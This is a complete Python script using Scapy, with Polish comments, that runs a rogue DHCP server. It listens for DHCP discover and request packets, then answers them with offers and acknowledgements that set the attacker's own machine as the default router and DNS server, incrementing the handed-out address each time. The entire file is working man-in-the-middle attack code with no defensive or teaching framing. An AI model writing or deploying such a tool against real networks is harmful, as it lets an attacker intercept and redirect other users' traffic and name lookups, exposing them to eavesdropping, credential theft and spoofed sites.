from scapy.all import *
from scapy.layers.l2 import Ether, getmacbyip, ARP
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import UDP, IP

# Konfiguracja interfejsu sieciowego
conf.iface = conf.iface
eth = conf.iface
my_mac = get_if_hwaddr(eth)
my_ip = get_if_addr(eth)

# Zmienne pomocnicze do adresacji
parts = my_ip.split('.')[0:3]
current_octet = 150

def dhcp_rogue(pkt):
    global current_octet
    
    if pkt.haslayer(DHCP) and pkt[BOOTP].op == 1 and pkt[Ether].src != my_mac:
        msg_type = pkt[DHCP].options[0][1]

        if msg_type == 1:
            offered_ip = '.'.join(parts) + f".{current_octet}"
            print(f"DHCP_OFFER: {offered_ip} for {pkt[Ether].src}")
            
            reply = (
                Ether(src=get_if_hwaddr(eth), dst=pkt[Ether].src) /
                IP(src=my_ip, dst='255.255.255.255') /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=offered_ip, siaddr=my_ip, xid=pkt[BOOTP].xid, chaddr=pkt[BOOTP].chaddr) /
                DHCP(options=[
                    ('message-type', 'offer'),
                    ("server_id", my_ip),
                    ('name_server', my_ip),
                    ('subnet_mask', '255.255.255.0'),
                    ('router', my_ip),
                    ('lease_time', 3600),
                    'end'
                ])
            )
            sendp(reply, iface=eth, verbose=False)

        elif msg_type == 3:
            requested_ip = next((opt[1] for opt in pkt[DHCP].options if opt[0] == 'requested_addr'), None)
            print(f"DHCP_REQUEST for {requested_ip}")
            
            ack = (
                Ether(src=get_if_hwaddr(eth), dst=pkt[Ether].src) /
                IP(src=my_ip, dst='255.255.255.255') /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=requested_ip, siaddr=my_ip, xid=pkt[BOOTP].xid, chaddr=pkt[BOOTP].chaddr) /
                DHCP(options=[
                    ('message-type', 'ack'),
                    ("server_id", my_ip),
                    ('name_server', my_ip),
                    ('lease_time', 3600),
                    ('subnet_mask', '255.255.255.0'),
                    ('router', my_ip),
                    'end'
                ])
            )
            sendp(ack, iface=eth, verbose=False)
            
            current_octet += 1
            print('Done')

if __name__ == '__main__':
    print(f'Interface: {eth}')
    print(f'IP: {my_ip}')
    print("Listening for DHCP requests...")

    sniff(filter='udp and (port 67 or 68)', prn=dhcp_rogue, iface=eth)
